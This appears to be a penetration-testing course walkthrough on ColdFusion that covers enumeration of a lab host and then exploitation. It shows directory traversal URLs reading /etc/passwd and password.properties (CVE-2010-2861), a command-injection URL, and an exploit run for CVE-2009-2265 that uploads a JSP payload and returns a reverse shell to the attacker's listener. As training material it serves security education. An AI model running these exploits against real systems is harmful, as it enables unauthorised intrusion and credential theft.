ColdFusion is a programming language and a web application development platform based on Java. It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications.

It has a syntax similar to HTML, making it easy to learn for web developers.

CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks.
For instance, the `cfquery` tag can execute SQL statements to retrieve data from a database :
```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```
Developers can then use the `cfloop` tag to iterate through the records retrieved from the database :
```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```
Thanks to its built-in functions and features, CFML enables developers to create complex business logic using minimal code. Moreover, ColdFusion supports other programming languages, such as JavaScript and Java, allowing developers to use their preferred programming language within the ColdFusion environment.

ColdFusion also offers support for email, PDF manipulation, graphing, and other commonly used features. The applications developed using ColdFusion can run on any server that supports its runtime. It is available for download from Adobe's website and can be installed on Windows, Mac, or Linux operating systems. ColdFusion applications can also be deployed on cloud platforms like Amazon Web Services or Microsoft Azure. Some of the primary purposes and benefits of ColdFusion include :

|**Benefits**|**Description**|
|---|---|
|`Developing data-driven web applications`|ColdFusion allows developers to build rich, responsive web applications easily. It offers session management, form handling, debugging, and more features. ColdFusion allows you to leverage your existing knowledge of the language and combines it with advanced features to help you build robust web applications quickly.|
|`Integrating with databases`|ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. ColdFusion provides advanced database connectivity and is designed to make it easy to retrieve, manipulate, and view data from a database and the web.|
|`Simplifying web content management`|One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL rewriting, file uploading, and handling of large forms. Furthermore, ColdFusion also supports AJAX by automatically handling the serialisation and deserialisation of AJAX-enabled components.|
|`Performance`|ColdFusion is designed to be highly performant and is optimised for low latency and high throughput. It can handle a large number of simultaneous requests while maintaining a high level of performance.|
|`Collaboration`|ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more. This allows for faster and more efficient development, reduced time-to-market and quicker delivery of projects.|

Despite being less popular than other web development platforms, ColdFusion is still widely used by developers and organisations globally. Thanks to its ease of use, rapid application development capabilities, and integration with other web technologies, it is an ideal choice for building web applications quickly and efficiently. ColdFusion has evolved, with new versions periodically released since its inception.

The latest stable version of ColdFusion, as of this writing, is ColdFusion 2021, with ColdFusion 2023 about to enter Alpha. Earlier versions include ColdFusion 2018, ColdFusion 2016, and ColdFusion 11, each with new features and improvements such as better performance, more straightforward integration with other platforms, improved security, and enhanced usability.

Like any web-facing technology, ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads. To improve the security of ColdFusion, developers must implement secure coding practices, input validation checks, and properly configure web servers and firewalls. Here are a few known vulnerabilities of ColdFusion:

1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

ColdFusion exposes a fair few ports by default:

|**Port Number**|**Protocol**|**Description**|
|---|---|---|
|80|HTTP|Used for non-secure HTTP communication between the web server and web browser.|
|443|HTTPS|Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.|
|1935|RPC|Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) is used for sending email messages.|
|8500|SSL|Used for server communication via Secure Socket Layer (SSL).|
|5500|Server Monitor|Used for remote administration of the ColdFusion server.|

It's important to note that default ports can be changed during installation or configuration.

# Enumeration
During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion :

|**Method**|**Description**|
|---|---|
|`Port Scanning`|ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.|
|`File Extensions`|ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.|
|`HTTP Headers`|Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.|
|`Error Messages`|If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.|
|`Default Files`|ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.|

### **NMap ports and service scan results**
```bash
nmap -p- -sC -Pn 10.129.247.30 --open

Starting Nmap 7.92 ( <https://nmap.org> ) at 2023-03-13 11:45 GMT
Nmap scan report for 10.129.247.30
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 350.38 seconds
```
The port scan results show three open ports. Two Windows RPC services, and one running on `8500`. As we know, `8500` is a default port that ColdFusion uses for SSL. Navigating to the `IP:8500` lists 2 directories, `CFIDE` and `cfdocs,` in the root, further indicating that ColdFusion is running on port 8500.

Navigating around the structure a bit shows lots of interesting info, from files with a clear `.cfm` extension to error messages and login pages.
![[CFIDE.webp]]
![[CFError.webp]]
The `/CFIDE/administrator` path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.
![[CF8.webp]]

# Attacking ColdFusion
Now that we know that ColdFusion 8 is a target, the next step is to check for existing known exploits. `Searchsploit` is a command-line tool for `searching and finding exploits` in the Exploit Database.

It is part of the Exploit Database project, a non-profit organisation providing a public repository of exploits and vulnerable software. `Searchsploit` searches through the Exploit Database and returns a list of exploits and their relevant details, including the name of the exploit, its description, and the date it was released.

### **Searchsploit**
```html
searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
As we know, the version of ColdFusion running is `ColdFusion 8`, and there are two results of interest. The `Adobe ColdFusion - Directory Traversal` and the `Adobe ColdFusion 8 - Remote Command Execution (RCE)` results.

### **Directory Traversal**
`Directory/Path Traversal` is an attack that allows an attacker to access files and directories outside of the intended directory in a web application.

The attack exploits the lack of input validation in a web application and can be executed through various `input fields` such as `URL parameters`, `form fields`, `cookies`, and more.

By manipulating input parameters, the attacker can traverse the directory structure of the web application and `access sensitive files`, including `configuration files`, `user data`, and other system files.

The attack can be executed by manipulating the input parameters in ColdFusion tags such as `CFFile` and `CFDIRECTORY,` which are used for file and directory operations such as uploading, downloading, and listing files.

Take the following ColdFusion code snippet :
```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```
In this code snippet, the ColdFusion `cfdirectory` tag lists the contents of the `uploads` directory, and the `cfloop` tag is used to loop through the query results and display the filenames as clickable links in HTML.

However, the `directory` parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vulnerability by manipulating the `directory` parameter to access files outside the `uploads` directory.
```html
<http://example.com/index.cfm?directory=../../../etc/&file=passwd>
```

In this example, the `../` sequence is used to navigate the directory tree and access the `/etc/passwd` file outside the intended location.

`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

These ColdFusion files are vulnerable to a directory traversal attack in `Adobe ColdFusion 9.0.1` and `earlier versions`.

Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the `locale parameter` in these specific ColdFusion files.

With this vulnerability, attackers can access files outside the intended directory by including `../` sequences in the file parameter.

For example, consider the following URL :
```html
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

In this example, the URL attempts to access the `mappings.cfm` file in the `/CFIDE/administrator/settings/` directory of the web application with a specified `en` locale.

However, a directory traversal attack can be executed by manipulating the URL's locale parameter, allowing an attacker to read arbitrary files located outside of the intended directory, such as configuration files or system files.
```html
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

In this example, the `../` sequences have been used to replace a valid `locale` to traverse the directory structure and access the `passwd` file located in the `/etc/` directory.

Using `searchsploit`, copy the exploit to a working directory and then execute the file to see what arguments it requires.
```html
searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard
```

### **Coldfusion - Exploitation**

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py 

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

The `password.properties` file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. 
It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like `database connections`, `mail servers`, `LDAP servers`, and other resources that require authentication.
By storing encrypted passwords in this file, ColdFusion can automatically retrieve and use them to authenticate with the respective services without requiring the manual entry of passwords each time. 
The file is usually in the `[cf_root]/lib` directory and can be managed through the ColdFusion Administrator.

By providing the correct parameters to the exploit script and specifying the path of the desired file, the script can trigger an exploit on the vulnerable endpoints mentioned above. The script will then output the result of the exploit attempt:

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\\\Q>[K\\=XP  \\n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

As we can see, the contents of the `password.properties` file have been retrieved, proving that this target is vulnerable to `CVE-2010-2861`.

### **Unauthenticated RCE**
In the context of ColdFusion web applications, an Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication.

This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality.

Take the following code:
```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```
In the above code, the `cmd` variable is created by concatenating the `cgi.query_string` variable with a command to be executed.

This command is then executed using the `cfexecute` function, which runs the Windows `cmd.exe` program with the specified arguments.

This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the `cmd` variable before executing it, nor does it require the user to be authenticated.

An attacker could simply pass a malicious command as the `cgi.query_string` variable, and it would be executed by the server.
```html
# Decoded: <http://www.example.com/index.cfm?;> echo "This server has been compromised!" > C:\\compromise.txt

<http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt>
```

This URL includes a semicolon (`%3B`) at the beginning of the query string, which can allow for the execution of multiple commands on the server.

This could potentially append legitimate functionality with an unintended command.

An example of a ColdFusion Unauthenticated RCE attack is the `CVE-2009-2265` vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the FCKeditor package, and is accessible on the following path:
```html
<http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=>
```

`CVE-2009-2265` is the vulnerability identified by our earlier searchsploit search as `Adobe ColdFusion 8 - Remote Command Execution (RCE)`.

### Searchsploit
```html
searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: <https://www.exploit-db.com/exploits/50057>
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057Bailly@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
A quick `cat` review of the code indicates that the script needs some information. Set the correct information and launch the exploit.
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```
The exploit will take a bit of time to launch, but it eventually will return a functional remote shell
```bash
python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--

Sending request and printing response...

		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( <https://nmap.org/ncat> )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
```

And we get a reverse shell :
```bash
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\\ColdFusion8\\runtime\\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\\ColdFusion8\\runtime\\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..
18/03/2008  11:11 ��            64.512 java2wsdl.exe
19/01/2008  09:59 ��         2.629.632 jikes.exe
18/03/2008  11:11 ��            64.512 jrun.exe
18/03/2008  11:11 ��            71.680 jrunsvc.exe
18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
18/03/2008  11:11 ��            64.512 jspc.exe
22/03/2017  08:53 ��             1.804 jvm.config
18/03/2008  11:11 ��            64.512 migrate.exe
18/03/2008  11:11 ��            34.816 portscan.dll
18/03/2008  11:11 ��            64.512 sniffer.exe
18/03/2008  11:11 ��            78.848 WindowsLogin.dll
18/03/2008  11:11 ��            64.512 wsconfig.exe
22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
18/03/2008  11:11 ��            64.512 wsdl2java.exe
18/03/2008  11:11 ��            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.776.704 bytes free
```